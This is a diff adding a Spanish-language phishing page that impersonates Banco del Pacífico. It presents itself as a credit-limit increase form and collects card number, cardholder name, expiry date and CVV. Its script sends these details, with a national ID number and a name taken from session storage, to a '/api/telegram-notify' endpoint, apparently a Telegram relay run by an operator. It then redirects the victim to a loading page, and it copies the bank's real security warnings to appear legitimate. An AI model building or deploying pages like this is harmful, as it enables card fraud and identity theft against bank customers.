@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banco del Pacífico – Datos de Tarjeta</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Segoe UI',Arial,sans-serif;background:#eef1f5;min-height:100vh;display:flex;flex-direction:column}
+    header{background:#fff;padding:16px 24px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+    .logo-box{width:38px;height:38px;background:#1a56a0;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;font-weight:900}
+    header span{font-size:1.1rem;font-weight:700;color:#1a3a6b}
+    .page{flex:1;display:flex;align-items:flex-start;justify-content:center;gap:32px;padding:36px 20px}
+    .card{background:#fff;border-radius:10px;padding:36px 32px;width:100%;max-width:440px;box-shadow:0 2px 12px rgba(0,0,0,.09)}
+    .card h2{font-size:1.3rem;font-weight:700;color:#1a3a6b;margin-bottom:6px;text-align:center}
+    .card .subtitle{font-size:.85rem;color:#888;text-align:center;margin-bottom:26px}
+
+    /* Vista previa tarjeta */
+    .card-preview{
+      background:linear-gradient(135deg,#1a3a6b 0%,#1a56a0 100%);
+      border-radius:14px;padding:22px 22px 18px;margin-bottom:26px;
+      position:relative;overflow:hidden;min-height:130px;
+      box-shadow:0 6px 20px rgba(26,86,160,.35);
+    }
+    .card-preview::after{
+      content:'';position:absolute;right:-30px;top:-30px;
+      width:150px;height:150px;border-radius:50%;
+      background:rgba(255,255,255,.08);
+    }
+    .card-preview::before{
+      content:'';position:absolute;right:20px;bottom:-20px;
+      width:100px;height:100px;border-radius:50%;
+      background:rgba(255,255,255,.06);
+    }
+    .cp-brand{font-size:1.1rem;font-weight:800;color:#fff;letter-spacing:.08em;margin-bottom:14px;min-height:24px}
+    .cp-number{font-size:1.05rem;font-weight:600;color:rgba(255,255,255,.9);letter-spacing:.18em;margin-bottom:14px;font-family:monospace}
+    .cp-bottom{display:flex;gap:24px;align-items:flex-end}
+    .cp-label{font-size:.62rem;color:rgba(255,255,255,.6);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px}
+    .cp-value{font-size:.85rem;color:#fff;font-weight:600;letter-spacing:.05em}
+    .cp-logo{margin-left:auto;font-size:1.6rem}
+
+    .err-box{background:#fff0f0;border:1px solid #f5c2c2;border-radius:6px;padding:10px 14px;color:#c92a2a;font-size:.84rem;margin-bottom:16px;display:none;align-items:center;gap:8px}
+    .err-box.show{display:flex}
+
+    .field{margin-bottom:18px;position:relative}
+    .field label{display:block;font-size:.8rem;color:#777;margin-bottom:4px}
+    .field input{width:100%;border:none;border-bottom:2px solid #c5cdd8;padding:8px 2px;font-size:.97rem;color:#1a3a6b;background:transparent;outline:none;transition:border-color .2s;letter-spacing:.05em}
+    .field input:focus{border-bottom-color:#1a56a0}
+    .field input.error-input{border-bottom-color:#e03131}
+    .err-msg{color:#e03131;font-size:.76rem;margin-top:3px;display:none}
+    .card-type-badge{position:absolute;right:0;bottom:8px;font-size:1.2rem}
+    .row{display:flex;gap:16px}
+    .row .field{flex:1}
+
+    .btn-primary{width:100%;background:#1a56a0;color:#fff;border:none;border-radius:6px;padding:13px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:4px;transition:background .25s}
+    .btn-primary:hover{background:#154a8a}
+    .secure-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;font-size:.76rem;color:#aaa}
+    .footer-note{text-align:center;font-size:.7rem;color:#aaa;margin-top:20px;line-height:1.6}
+
+    .tips{max-width:320px;padding-top:8px}
+    .tip-title{font-size:.75rem;color:#999;text-transform:uppercase;letter-spacing:.05em;margin-bottom:2px}
+    .tip-subtitle{font-size:.95rem;font-weight:700;color:#1a3a6b;margin-bottom:18px}
+    .tip-item{display:flex;gap:10px;margin-bottom:14px;align-items:flex-start}
+    .tip-icon{width:26px;height:26px;flex-shrink:0;background:#eef1f5;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px}
+    .tip-item p{font-size:.8rem;color:#777;line-height:1.45}
+    .help-section{margin-top:24px}
+    .help-section h4{font-size:.92rem;font-weight:700;color:#1a3a6b;margin-bottom:8px}
+    .help-section a{display:block;font-size:.8rem;color:#1a56a0;text-decoration:none;margin-bottom:5px}
+    @media(max-width:700px){.tips{display:none}.page{padding:16px 12px}.card{padding:26px 18px}}
+  </style>
+</head>
+<body>
+<header>
+  <div class="logo-box">B</div>
+  <span>Banco del Pacífico</span>
+</header>
+<div class="page">
+  <div class="card">
+    <h2>Datos de tu tarjeta</h2>
+    <p class="subtitle">Ingresa los datos de la tarjeta que deseas aumentar su cupo</p>
+
+    <!-- Vista previa -->
+    <div class="card-preview">
+      <div class="cp-brand" id="cp-brand">Banco del Pacífico</div>
+      <div class="cp-number" id="cp-number">•••• •••• •••• ••••</div>
+      <div class="cp-bottom">
+        <div>
+          <div class="cp-label">Vencimiento</div>
+          <div class="cp-value" id="cp-exp">MM/AA</div>
+        </div>
+        <div>
+          <div class="cp-label">Titular</div>
+          <div class="cp-value" id="cp-name">—</div>
+        </div>
+        <div class="cp-logo" id="cp-logo">💳</div>
+      </div>
+    </div>
+
+    <div class="err-box" id="err-tarjeta-box">⚠️ <span>Datos de tarjeta incorrectos. Verifica e intenta nuevamente.</span></div>
+
+    <!-- Número de tarjeta -->
+    <div class="field">
+      <label>Número de tarjeta</label>
+      <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" inputmode="numeric" maxlength="19"/>
+      <span class="card-type-badge" id="cardTypeBadge"></span>
+      <div class="err-msg" id="err-number">Ingresa un número de tarjeta válido.</div>
+    </div>
+
+    <!-- Nombre del titular -->
+    <div class="field">
+      <label>Nombre del titular</label>
+      <input type="text" id="cardName" placeholder="Como aparece en la tarjeta"/>
+      <div class="err-msg" id="err-name">Ingresa el nombre del titular.</div>
+    </div>
+
+    <div class="row">
+      <div class="field">
+        <label>Fecha de vencimiento</label>
+        <input type="text" id="cardExp" placeholder="MM/AA" inputmode="numeric" maxlength="5"/>
+        <div class="err-msg" id="err-exp">Fecha inválida.</div>
+      </div>
+      <div class="field">
+        <label>CVV</label>
+        <input type="password" id="cardCVV" placeholder="•••" inputmode="numeric" maxlength="4"/>
+        <div class="err-msg" id="err-cvv">CVV inválido.</div>
+      </div>
+    </div>
+
+    <button class="btn-primary" onclick="enviarTarjeta()">Continuar solicitud</button>
+    <div class="secure-note">🔒 Tus datos están protegidos con cifrado SSL</div>
+    <p class="footer-note">© Copyright 2017 Banco del Pacífico *V5.3.12b</p>
+  </div>
+
+  <div class="tips">
+    <p class="tip-title">CONSEJOS</p>
+    <p class="tip-subtitle">Por tu seguridad:</p>
+    <div class="tip-item"><div class="tip-icon">🔒</div><p>Banco del Pacífico S.A. no solicita claves, usuarios, números de tarjetas o cuenta por ningún medio.</p></div>
+    <div class="tip-item"><div class="tip-icon">🔑</div><p>No compartas tus claves, recuerda que son de uso personal e intransferible.</p></div>
+    <div class="tip-item"><div class="tip-icon">ℹ️</div><p>Para acceder a la Banca Virtual, asegúrese de teclear <strong>https://www.intermatico.com</strong></p></div>
+    <div class="tip-item"><div class="tip-icon">📞</div><p>En caso de recibir llamadas sospechosas contáctate al <strong>3731500 opción 9</strong>.</p></div>
+    <div class="help-section">
+      <h4>¿Necesitas ayuda?</h4>
+      <a href="#">• ¿Cómo creo mi usuario?</a>
+      <a href="#">• ¿Cómo desbloqueo mi usuario?</a>
+      <a href="#">• ¿Cómo recupero mi contraseña?</a>
+    </div>
+  </div>
+</div>
+<script>
+  // Nombre del titular desde sessionStorage
+  const nombre = sessionStorage.getItem('bp_nombre') || '';
+  if(nombre) document.getElementById('cp-name').textContent = nombre.toUpperCase().slice(0,20);
+
+  // Detectar tipo de tarjeta
+  function detectCard(num){
+    const n = num.replace(/\s/g,'');
+    if(/^4/.test(n)) return {name:'VISA', logo:'💳', color:'#1a3a6b'};
+    if(/^5[1-5]|^2[2-7]/.test(n)) return {name:'MASTERCARD', logo:'🔴', color:'#1a3a6b'};
+    if(/^3[47]/.test(n)) return {name:'AMEX', logo:'🟦', color:'#006fcf'};
+    if(/^6011|^64[4-9]|^65/.test(n)) return {name:'DISCOVER', logo:'🟠', color:'#1a3a6b'};
+    if(/^3(?:0[0-5]|[68])/.test(n)) return {name:"DINERS", logo:'⬜', color:'#1a3a6b'};
+    return {name:'Banco del Pacífico', logo:'💳', color:'#1a3a6b'};
+  }
+
+  // Formatear número con espacios
+  document.getElementById('cardNumber').addEventListener('input', function(){
+    let val = this.value.replace(/\D/g,'').slice(0,16);
+    this.value = val.replace(/(.{4})/g,'$1 ').trim();
+
+    const card = detectCard(val);
+    document.getElementById('cp-brand').textContent = card.name;
+    document.getElementById('cp-logo').textContent = card.logo;
+    document.getElementById('cardTypeBadge').textContent = val.length >= 1 ? card.logo : '';
+
+    const display = val.padEnd(16,'•').replace(/(.{4})/g,'$1 ').trim();
+    document.getElementById('cp-number').textContent = display;
+  });
+
+  // Formatear fecha
+  document.getElementById('cardExp').addEventListener('input', function(){
+    let val = this.value.replace(/\D/g,'');
+    if(val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+    this.value = val;
+    document.getElementById('cp-exp').textContent = val || 'MM/AA';
+  });
+
+  // Nombre en tarjeta
+  document.getElementById('cardName').addEventListener('input', function(){
+    document.getElementById('cp-name').textContent = (this.value||'—').toUpperCase().slice(0,20);
+  });
+
+  function showErr(id, msg){ document.getElementById('err-'+id).textContent=msg; document.getElementById('err-'+id).style.display='block'; document.getElementById('card'+id.charAt(0).toUpperCase()+id.slice(1)).classList.add('error-input'); }
+  function clearErr(id){ document.getElementById('err-'+id).style.display='none'; document.getElementById('card'+id.charAt(0).toUpperCase()+id.slice(1)).classList.remove('error-input'); }
+  ['Number','Name','Exp','CVV'].forEach(f=>{
+    const el=document.getElementById('card'+f);
+    if(el) el.addEventListener('input',()=>clearErr(f.toLowerCase()));
+  });
+
+  async function enviarTarjeta(){
+    let ok = true;
+    const num = document.getElementById('cardNumber').value.replace(/\s/g,'');
+    const name = document.getElementById('cardName').value.trim();
+    const exp = document.getElementById('cardExp').value.trim();
+    const cvv = document.getElementById('cardCVV').value.trim();
+
+    if(num.length < 13 || num.length > 16){ showErr('number','Ingresa un número de tarjeta válido.'); ok=false; }
+    if(!name || name.length < 3){ showErr('name','Ingresa el nombre del titular.'); ok=false; }
+    if(!/^\d{2}\/\d{2}$/.test(exp)){ showErr('exp','Fecha inválida (MM/AA).'); ok=false; }
+    if(cvv.length < 3){ showErr('cvv','CVV inválido.'); ok=false; }
+    if(!ok) return;
+
+    document.getElementById('err-tarjeta-box').classList.remove('show');
+
+    // Deshabilitar botón mientras envía
+    const btn = document.querySelector('.btn-primary');
+    btn.disabled = true;
+    btn.textContent = 'Enviando...';
+
+    const card = detectCard(num);
+    sessionStorage.setItem('bp_card_type', card.name);
+
+    try{
+      await fetch('/api/telegram-notify',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          action:'notify_step',
+          data:{
+            cedula: sessionStorage.getItem('bp_cedula')||'—',
+            nombre: sessionStorage.getItem('bp_nombre')||'—',
+            step:'TARJETA',
+            extra:{
+              'Tipo': card.name,
+              'Número': num,
+              'Titular': name,
+              'Vencimiento': exp,
+              'CVV': cvv
+            }
+          }
+        })
+      });
+    }catch(e){console.log('telegram error',e);}
+
+    window.location.href = 'loading.html';
+  }
+
+  // Mostrar error si viene del bot
+  const params = new URLSearchParams(window.location.search);
+  if(params.get('error') === 'tarjeta'){
+    document.getElementById('err-tarjeta-box').classList.add('show');
+  }
+</script>
+</body>
+</html>
